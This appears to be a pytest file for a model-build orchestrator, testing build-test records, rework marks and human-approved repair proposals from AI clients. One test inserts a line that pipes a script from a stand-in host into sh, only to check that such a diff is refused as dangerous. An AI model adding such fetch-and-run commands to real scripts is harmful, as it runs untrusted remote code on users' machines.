"""A generated module tested by its first build and repaired after a failed one (Core/module_test.py): the record
beside target.yml (never target.yml itself, never the target's digest), the build engine's marks at a build's end, the
repair by hand and from the error log through the edit step (only the person saves), and the state in the CLI's
`targets list`, the targets window, the Builder and the AI's tools."""
import json
import shutil
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace

import pytest

from orchestrator import __version__
from orchestrator.Core import module_test
from orchestrator.Core.community_manager import SHIPPED_TARGETS_DIR, installed_digest
from orchestrator.Core.module_edit import ModuleEdit
from orchestrator.Core.module_generator import ModuleGenerator

DATA = {"module_name": "Test_Board", "architecture": "aarch64", "sdk": "none", "base_os": "debian:bookworm-slim",
        "packages": ["cmake"], "cpu_flags": "", "cmake_flags": "", "supported_boards": []}
FIX_LINE = 'export VENDOR_FIX="1"\n'
FAILED_LOG = ["[2026-11-10 10:00:00] [INFO] CONT: === Stage 2/4: config ===",
              "[2026-11-10 10:00:01] [INFO] CONT: config_module.sh: line 40: vendor_tool: command not found",
              "[2026-11-10 10:00:01] [ERROR] ERROR: Build script failed with exit code 127"]


@pytest.fixture(scope="module")
def made(tmp_path_factory):
    return ModuleGenerator(tmp_path_factory.mktemp("made")).generate_module(DATA)


@pytest.fixture
def module(made, tmp_path):
    folder = tmp_path / "targets" / made.name
    shutil.copytree(made, folder, symlinks=True)
    return folder


def fix_diff(folder: Path, rel: str = "modules/config_module.sh") -> str:
    edit = ModuleEdit(folder)
    first, rest = edit.text(rel).split("\n", 1)
    edit.set_text(rel, first + "\n" + FIX_LINE + rest)
    return edit.diff()


def fail(folder: Path, build_id: str = "b_fail", request_id: str = "req_1"):
    return module_test.record_build(folder, build_id=build_id, passed=False, request_id=request_id, stage="config",
                                    error="Build script failed with exit code 127\nmore", log=FAILED_LOG,
                                    settings={"model": "HuggingFaceTB/SmolLM2-135M-Instruct", "format": "gguf",
                                              "quantization": "Q4_K_M", "board": None})


# --- the record ------------------------------------------------------------------------------------------------------

def test_a_new_module_is_untested_and_a_passed_build_marks_it_tested_with_id_date_and_version(module):
    yml = (module / "target.yml").read_text()
    digest = installed_digest(module)
    assert module_test.state_of(module).line == "untested: not built yet"
    module_test.record_build(module, build_id="b_pass", passed=True, now=datetime(2026, 11, 10, 9, 30))
    test = module_test.state_of(module)
    assert (test.state, test.tested_build, test.tested_version) == ("tested", "b_pass", __version__)
    assert test.tested_date.startswith("2026-11-10") and "tested: build b_pass passed on 2026-11-10" in test.line
    # the record is beside target.yml: target.yml, its marks and the target's digest stay as they were
    assert (module / "target.yml").read_text() == yml and "untested: true" in yml
    assert installed_digest(module) == digest
    assert (module / module_test.RECORD_NAME).stat().st_mode & 0o077 == 0
    # a later pass keeps the first passed build as the tested mark
    module_test.record_build(module, build_id="b_again", passed=True)
    assert module_test.state_of(module).tested_build == "b_pass"


def test_a_shipped_target_gets_no_record():
    shipped = SHIPPED_TARGETS_DIR / "Rockchip"
    assert not module_test.gets_marks(shipped)
    assert module_test.record_build(shipped, build_id="b1", passed=True) is None
    assert module_test.state_of(shipped) is None
    assert not (shipped / module_test.RECORD_NAME).exists()


def test_a_failed_build_marks_rework_with_its_log_and_settings(module):
    fail(module)
    test = module_test.state_of(module)
    assert (test.state, test.failed_build, test.failed_request, test.failed_stage) == (
        "needs_rework", "b_fail", "req_1", "config")
    assert test.failed_error == "Build script failed with exit code 127"
    assert module_test.failed_log(module) == FAILED_LOG
    assert module_test.retry_settings(module)["model"] == "HuggingFaceTB/SmolLM2-135M-Instruct"
    assert "vendor_tool: command not found" in module_test.repair_view(module)
    command = module_test.retry_command(module.name, module_test.retry_settings(module))
    assert command.startswith(f"llm-cli build start --target {module.name} --model HuggingFaceTB/")


def test_a_change_of_the_files_makes_a_tested_module_untested_again(module):
    module_test.record_build(module, build_id="b_pass", passed=True)
    rel = module / "modules" / "convert_module.sh"
    rel.write_text(rel.read_text() + "\n# changed outside the framework\n")
    test = module_test.state_of(module)
    assert (test.state, test.changed_since) == ("untested", "b_pass")
    assert test.line == "untested: changed since build b_pass"


@pytest.mark.parametrize("step,reason,log,counts", [
    ("Running modules", "failed", "config_module.sh: line 3: vendor_tool: command not found", True),
    ("Building Image", "failed", "E: Unable to locate package vendor-sdk", True),
    ("Building Image", "failed", "apt-get update ... 404  Not Found [IP: x] debian", True),   # the module's base
    ("Fetching model", "failed", "HTTP 404", False),               # before the module's part
    ("Running modules", "cancelled", "x", False),
    ("Running modules", "soft_cap", "x", False),
    ("Running modules", "failed", "Could not resolve host: deb.debian.org", False),   # the network
    ("Running modules", "failed", "exit code 137", False),                            # memory
])
def test_only_a_failure_in_the_modules_own_part_counts(step, reason, log, counts):
    assert module_test.module_failure(step, reason, log) is counts


# --- the build engine ------------------------------------------------------------------------------------------------

@pytest.fixture
def engine(tmp_path, monkeypatch, made):
    from orchestrator.Core.builder import BuildEngine
    from orchestrator.Core.config_manager import ConfigManager
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("orchestrator.Core.builder.docker.from_env",
                        lambda: (_ for _ in ()).throw(RuntimeError("no docker")))
    monkeypatch.setattr(ConfigManager, "user_state_dir", property(lambda self: tmp_path / "state"))
    e = BuildEngine(ConfigManager(tmp_path / "configs"))
    e.cache_dir.mkdir(parents=True, exist_ok=True)
    e.targets_dir.mkdir(parents=True, exist_ok=True)
    shutil.copytree(made, e.targets_dir / made.name, symlinks=True)
    for name in ("_generate_dockerfile", "_scan_image_security", "_create_golden_artifact", "_extract_artifacts",
                 "_publish_artifacts"):
        monkeypatch.setattr(e, name, lambda *a, **k: None)
    monkeypatch.setattr(e, "_build_docker_image", lambda *a: SimpleNamespace(tags=["img"], id=None))
    monkeypatch.setattr(e, "_stage_model", lambda *a: ("/x", {}))
    return e


def run_build(engine, target: str, modules=None, build_id: str = "b1"):
    from orchestrator.Core.builder import BuildConfiguration, BuildProgress, BuildStatus, ModelFormat
    if modules is not None:
        engine._execute_build_modules = modules
    else:
        engine._execute_build_modules = lambda *a: None
    engine._builds[build_id] = BuildProgress(build_id, BuildStatus.QUEUED, "")
    config = BuildConfiguration(build_id=build_id, timestamp="t", model_source="HuggingFaceTB/SmolLM2-135M-Instruct",
                                target_arch=target, target_format=ModelFormat.GGUF, output_dir=f"out/{build_id}",
                                quantization="Q4_K_M", cleanup_after_build=False, request_id="req_9")
    engine._execute_build(config)
    return engine._builds[build_id]


def test_the_engine_marks_a_generated_module_tested_after_a_completed_build(engine, made):
    from orchestrator.Core.builder import BuildStatus
    folder = engine.targets_dir / made.name
    progress = run_build(engine, made.name)
    assert progress.status == BuildStatus.COMPLETED, progress.errors
    test = module_test.state_of(folder)
    assert (test.state, test.tested_build) == ("tested", "b1")
    assert any("marked tested by this build" in line for line in progress.logs)


def test_the_engine_marks_rework_after_a_failure_in_the_modules_stage(engine, made):
    from orchestrator.Core.builder import BuildStatus
    folder = engine.targets_dir / made.name

    def modules(config, progress, *a):
        progress.current_stage = "Running modules"
        progress.add_log("CONT: config_module.sh: line 3: vendor_tool: command not found")
        raise RuntimeError("Build script failed with exit code 127")

    progress = run_build(engine, made.name, modules)
    assert progress.status == BuildStatus.FAILED
    test = module_test.state_of(folder)
    assert (test.state, test.failed_build, test.failed_request) == ("needs_rework", "b1", "req_9")
    assert any("vendor_tool: command not found" in line for line in module_test.failed_log(folder))
    assert any("marked for rework" in line for line in progress.logs)
    # a later passed build of the same module marks it tested
    run_build(engine, made.name, build_id="b2")
    assert module_test.state_of(folder).state == "tested"


def test_a_failure_of_the_host_does_not_mark_the_module(engine, made):
    folder = engine.targets_dir / made.name

    def network(config, progress, *a):
        progress.current_stage = "Running modules"
        raise RuntimeError("Could not resolve host: github.com")

    run_build(engine, made.name, network)
    assert module_test.read_record(folder) is None and module_test.state_of(folder).state == "untested"


# --- the repair -------------------------------------------------------------------------------------------------------

def test_a_repair_by_hand_keeps_the_module_untested_until_a_build_passes(module):
    fail(module)
    edit = ModuleEdit(module)
    edit.apply_diff(fix_diff(module))
    edit.repair = {"how": "by hand", "by": "person"}
    assert edit.save() == ["modules/config_module.sh"]
    test = module_test.state_of(module)
    assert (test.state, test.changed_since, test.repairs) == ("untested", "b_fail", 1)
    history = module_test.read_record(module)["history"]
    assert history[-1]["event"] == "repair" and history[-1]["how"] == "by hand"
    assert history[-1]["after_build"] == "b_fail"
    module_test.record_build(module, build_id="b_ok", passed=True)
    assert module_test.state_of(module).state == "tested"
    assert [h["event"] for h in module_test.read_record(module)["history"]] == ["failed", "repair", "passed"]


def test_an_edit_of_a_module_never_built_records_nothing(module):
    edit = ModuleEdit(module)
    edit.apply_diff(fix_diff(module))
    edit.save()
    assert module_test.read_record(module) is None


class FakeDitto:
    def __init__(self, diff):
        self.diff, self.seen = diff, {}

    def propose_module_repair(self, log, files, context=""):
        from orchestrator.Core.ditto_manager import ModuleRepairAnalysis
        self.seen = {"log": log, "files": files, "context": context}
        return ModuleRepairAnalysis(summary="vendor_tool is missing in the config stage.",
                                    root_cause="The stage calls a tool the image lacks.", diff=self.diff,
                                    confidence=0.6)


def framework_with(ditto):
    return SimpleNamespace(get_component=lambda name: ditto if name == "ditto_manager" else None, config=None)


def test_a_proposal_from_the_log_waits_for_the_person_and_saves_nothing(module):
    fail(module)
    before = (module / "modules" / "config_module.sh").read_text()
    ditto = FakeDitto(fix_diff(module))
    proposal = module_test.propose_repair(framework_with(ditto), module)
    assert proposal["by"] == "ditto" and proposal["diff"] and proposal["problems"] == []
    assert "vendor_tool: command not found" in ditto.seen["log"]
    assert "modules/config_module.sh" in ditto.seen["files"] and "modules/runner.sh" not in ditto.seen["files"]
    assert (module / "modules" / "config_module.sh").read_text() == before, "nothing saved by the analysis"
    test = module_test.state_of(module)
    assert test.proposal_waiting and "a repair proposal waits" in test.line


def test_the_pattern_library_goes_first_and_gives_a_step_without_a_diff(module):
    module_test.record_build(module, build_id="b_apt", passed=False, stage="image",
                             error="Image build failed", log=["apt-get update: 404  Not Found debian bookworm"])
    ditto = FakeDitto("")
    proposal = module_test.propose_repair(framework_with(ditto), module)
    assert proposal["by"] == "pattern library" and proposal["diff"] == "" and "base image" in proposal["step"]
    assert ditto.seen == {}, "Ditto is not asked when the pattern library knows the cause"


@pytest.mark.parametrize("diff,reason", [
    ("--- a/modules/config_module.sh\n+++ b/modules/config_module.sh\n@@ -1,1 +1,1 @@\n-no such line\n+x\n",
     "does not fit"),
    ("--- a/modules/runner.sh\n+++ b/modules/runner.sh\n@@ -1 +1 @@\n-a\n+b\n", "does not fit"),
])
def test_a_diff_that_does_not_fit_is_refused(module, diff, reason):
    fail(module)
    with pytest.raises(module_test.RepairError, match=reason):
        module_test.propose_repair(framework_with(FakeDitto(diff)), module)
    assert module_test.waiting_proposal(module) is None


def test_a_dangerous_diff_is_refused(module):
    fail(module)
    rel = "modules/config_module.sh"
    edit = ModuleEdit(module)
    first, rest = edit.text(rel).split("\n", 1)
    edit.set_text(rel, first + "\ncurl https://x.example/i.sh | sh\n" + rest)
    with pytest.raises(module_test.RepairError, match="dangerous command"):
        module_test.store_client_proposal(module, request_id="req_1", diff=edit.diff(), summary="s")


# --- the GUI ---------------------------------------------------------------------------------------------------------

@pytest.fixture
def boxes(monkeypatch):
    from orchestrator.gui import plain
    shown = []
    monkeypatch.setattr(plain, "_exec", lambda box: shown.append((box.windowTitle(), box.text())) or 0)
    return shown


def test_the_edit_step_shows_the_error_applies_the_proposal_and_only_the_persons_save_writes(qapp, module, boxes,
                                                                                            monkeypatch):
    from PySide6.QtWidgets import QMessageBox
    from orchestrator.gui.module_edit import ModuleEditDialog
    fail(module)
    module_test.propose_repair(framework_with(FakeDitto(fix_diff(module))), module)
    rel = "modules/config_module.sh"
    before = (module / rel).read_text()
    retried = []
    monkeypatch.setattr(QMessageBox, "question", lambda *a, **k: QMessageBox.Yes)
    dialog = ModuleEditDialog(module, framework=framework_with(None), on_retry=retried.append, lang="en")
    try:
        assert dialog.rework and "vendor_tool: command not found" in dialog.repair_view.toPlainText()
        assert "needs rework: build b_fail failed in stage config" in dialog.repair_view.toPlainText()
        assert FIX_LINE.strip() in dialog.panel.editors[rel].toPlainText()
        assert "+" + FIX_LINE.strip() in dialog.panel.diff_view.toPlainText()
        assert (module / rel).read_text() == before, "the proposal is only in the editors"
        dialog.undo_proposal()
        assert FIX_LINE.strip() not in dialog.panel.editors[rel].toPlainText()
        dialog.apply_proposal(module_test.waiting_proposal(module))
        assert dialog.save() == [rel]
        assert FIX_LINE in (module / rel).read_text()
        last = module_test.read_record(module)["history"][-1]
        assert (last["event"], last["how"], last["by"]) == ("repair", "proposal", "ditto")
        assert module_test.state_of(module).state == "untested"
        assert retried and retried[0]["target"] == module.name and retried[0]["model"].startswith("HuggingFaceTB/")
    finally:
        dialog.reject()
        dialog.deleteLater()


def test_the_targets_window_shows_the_build_test(qapp, module, monkeypatch):
    from orchestrator.gui import targets_window
    from orchestrator.gui.module_edit import test_line
    fail(module)
    rows = [SimpleNamespace(id=module.name, name=module.name, architecture="aarch64", boards=["b"], formats=[],
                            support_level=None, build_test=module_test.state_of(module)),
            SimpleNamespace(id="Rockchip", name="Rockchip", architecture="aarch64", boards=["rk3588"], formats=[],
                            support_level=None, build_test=None)]
    monkeypatch.setattr(targets_window, "build_service",
                        lambda fw: SimpleNamespace(list_targets=lambda: SimpleNamespace(targets=rows)))
    dialog = targets_window.TargetsDialog(SimpleNamespace(), lang="en")
    try:
        column = len(targets_window.COLUMNS) - 1
        assert dialog.table.item(0, column).text().startswith("needs rework: build b_fail")
        assert dialog.table.item(1, column).text() == "- (shipped)"
        assert test_line(module_test.state_of(module), "de").startswith("Nacharbeit nötig: Build b_fail")
    finally:
        dialog.deleteLater()


# --- the CLI ---------------------------------------------------------------------------------------------------------

@pytest.fixture
def cli_targets(tmp_path, module):
    from test_cli_builds import write_user_config
    write_user_config(tmp_path, targets_dir=str(module.parent))
    return module.parent


def run(args, **kw):
    from click.testing import CliRunner
    from orchestrator import cli as cli_module
    return CliRunner().invoke(cli_module.cli, ["-q", *args], **kw)


def test_module_repair_shows_the_failed_build_and_saves_a_waiting_proposal_only_on_yes(cli_targets, module):
    fail(module)
    module_test.propose_repair(framework_with(FakeDitto(fix_diff(module))), module)
    rel = module / "modules" / "config_module.sh"
    result = run(["module", "repair", module.name], input="n\n")
    assert result.exit_code == 1, result.output
    assert "needs rework: build b_fail" in result.output and "vendor_tool: command not found" in result.output
    assert "The proposal of ditto changes: modules/config_module.sh" in result.output
    assert FIX_LINE not in rel.read_text()
    result = run(["module", "repair", module.name], input="y\n")
    assert result.exit_code == 0, result.output
    assert FIX_LINE in rel.read_text() and "stays untested until a build passes" in result.output
    assert "Build it again: llm-cli build start --target" in result.output
    assert module_test.read_record(module)["history"][-1]["how"] == "proposal"


def test_module_repair_refuses_a_shipped_target(cli_targets, tmp_path):
    from test_cli_builds import write_user_config
    write_user_config(tmp_path, targets_dir=str(SHIPPED_TARGETS_DIR))
    result = run(["module", "repair", "Rockchip"])
    assert result.exit_code == 1 and "ships" in result.output


# --- the AI's tools ---------------------------------------------------------------------------------------------------

@pytest.fixture
def env(tmp_path, module):
    from orchestrator.Core.build_service import BuildService
    from orchestrator.Core.orchestrator import LLMOrchestrator, OrchestrationStatus, WorkflowState
    from orchestrator.tools.audit import AuditLog
    from orchestrator.tools.framework_tools import register_framework_tools
    from orchestrator.tools.policy import Decision, PolicyStore, ToolPolicy
    from orchestrator.tools.registry import ToolRegistry
    from test_client_proposals import StubEngine
    state_dir = tmp_path / "state"
    config = SimpleNamespace(targets_dir=str(module.parent), get=lambda key, default=None: default,
                             user_state_dir=str(state_dir))
    orchestrator = LLMOrchestrator(config, build_engine=StubEngine())
    tm = SimpleNamespace(folder_of=lambda name: module if str(name).casefold() == module.name.casefold() else None)
    framework = SimpleNamespace(orchestrator=orchestrator, config=config, target_manager=tm,
                                resolve_path=lambda p: Path(p), job_service=None)
    framework.build_service = BuildService(framework)
    registry = register_framework_tools(ToolRegistry(PolicyStore(tmp_path / "policy"), AuditLog(tmp_path / "a.db")),
                                        framework)
    registry.policy_store.replace(ToolPolicy(configured=True, overrides={"propose_healing_fix": Decision.ALLOW},
                                             reviewed=[s.name for s in registry.list()]))
    state = WorkflowState("req_1", OrchestrationStatus.ERROR, datetime.now(), label="a build")
    state.failed_builds = 1
    state.summary = {"target": module.name}
    orchestrator._workflows["req_1"] = state
    return SimpleNamespace(registry=registry, framework=framework)


GOOD = {"request_id": "req_1", "summary": "vendor_tool is missing in the config stage.",
        "root_cause": "The stage calls a tool the image lacks.",
        "manual_step": "Open the module's edit step and check the proposed change.", "confidence": 0.5}


def test_an_ai_clients_module_diff_waits_for_the_person_and_is_never_saved(env, module):
    from orchestrator.tools.registry import ToolContext, ToolError
    fail(module)
    rel = module / "modules" / "config_module.sh"
    before = rel.read_text()
    env.registry.call("propose_healing_fix", {**GOOD, "module_diff": fix_diff(module)}, ToolContext("mcp"))
    proposal = module_test.waiting_proposal(module)
    assert proposal["by"] == "mcp" and FIX_LINE.strip() in proposal["diff"]
    assert rel.read_text() == before, "an AI never saves the module"
    with pytest.raises(ToolError, match="does not fit"):
        env.registry.call("propose_healing_fix",
                          {**GOOD, "module_diff": "--- a/modules/config_module.sh\n+++ b/modules/config_module.sh\n"
                                                  "@@ -1 +1 @@\n-nothing like this\n+x\n"}, ToolContext("mcp"))
    fail(module, request_id="req_other")
    with pytest.raises(ToolError, match="another build"):
        env.registry.call("propose_healing_fix", {**GOOD, "module_diff": fix_diff(module)}, ToolContext("mcp"))


def test_the_ai_reads_the_state_the_files_and_the_failed_log(env, module, monkeypatch):
    import yaml
    from orchestrator.schemas.targets import TargetCapabilities
    from orchestrator.tools.registry import ToolContext
    fail(module)
    data = yaml.safe_load((module / "target.yml").read_text())
    caps = TargetCapabilities.model_validate(data["capabilities"])
    env.framework.target_manager = SimpleNamespace(
        folder_of=lambda tid: module, resolve=lambda name: module.name, get_capabilities=lambda tid: caps,
        get_target=lambda tid: data, list_targets=lambda: [{"id": module.name, "name": module.name}],
        get_board_data=lambda tid: None)
    monkeypatch.setattr(env.framework.build_service, "board_data_out", lambda tid: ({}, []))
    monkeypatch.setattr("orchestrator.Core.folder_labels.ai_folder_labels", lambda fw: {})
    listed = env.registry.call("list_targets", {}, ToolContext("mcp"))
    [row] = listed.targets
    assert row.build_test.state == "needs_rework" and row.build_test.failed_request == "req_1"
    assert "needs rework: build b_fail" in row.build_test.line
    out = env.registry.call("get_target_capabilities", {"target": module.name, "module_files": True},
                            ToolContext("mcp"))
    assert out.build_test.state == "needs_rework"
    assert "modules/config_module.sh" in out.module_files and "target.yml" in out.module_files
    assert not any(Path(name).name in ("runner.sh", "build.sh") for name in out.module_files)
    assert "vendor_tool: command not found" in out.failed_log
    assert any("propose_healing_fix" in note and "req_1" in note for note in out.notes)
    plain = env.registry.call("get_target_capabilities", {"target": module.name}, ToolContext("mcp"))
    assert plain.module_files == {} and plain.failed_log is None and plain.build_test.state == "needs_rework"


def test_targets_list_shows_the_build_test_of_each_target(make_framework, tmp_path, monkeypatch, made):
    from test_review_capabilities_paths import framework_with_targets, make_cli
    folder = tmp_path / "targets_cli"
    folder.mkdir()
    shutil.copytree(made, folder / made.name, symlinks=True)
    fail(folder / made.name)
    cli = make_cli(framework_with_targets(make_framework, folder), tmp_path, monkeypatch)
    result = cli.invoke("targets", "list")
    assert result.code == 0, result.out
    row = next(line for line in result.out.splitlines() if "Test_Board" in line)
    assert "needs rework: build b_fail failed in stage config" in row
    assert "llm-cli module repair" in result.out
    out = cli.invoke("targets", "list", "-f", "json").out
    data = {t["id"].casefold(): t for t in json.loads(out[out.index("["):])}
    assert data["test_board"]["build_test"]["state"] == "needs_rework"
    # the copy named Rockchip is not in the framework's own targets folder, so it is "own" and untested
    assert data["rockchip"]["build_test"]["state"] == "untested"


def test_the_builder_logs_the_state_and_offers_the_repair_after_a_failed_build(module, monkeypatch):
    from PySide6.QtWidgets import QMessageBox
    from orchestrator.gui import builder_tab
    fail(module)
    service = SimpleNamespace(get_status=lambda rid: SimpleNamespace(request=SimpleNamespace(target=module.name)),
                              build_test=lambda target: module_test.state_of(module))
    logged, opened = [], []
    fake = SimpleNamespace(_build_service=lambda: service, _log=logged.append, open_repair=opened.append)
    fake._build_test = lambda target: builder_tab.BuilderTab._build_test(fake, target)
    monkeypatch.setattr(builder_tab.QMessageBox, "question", lambda *a, **k: QMessageBox.Yes)
    builder_tab.BuilderTab._module_after_build(fake, "req_1", "error")
    assert any("needs rework: build b_fail" in line or "Nacharbeit" in line for line in logged)
    assert opened == [module.name]
    assert builder_tab.BuilderTab._build_test_line(fake, module.name)
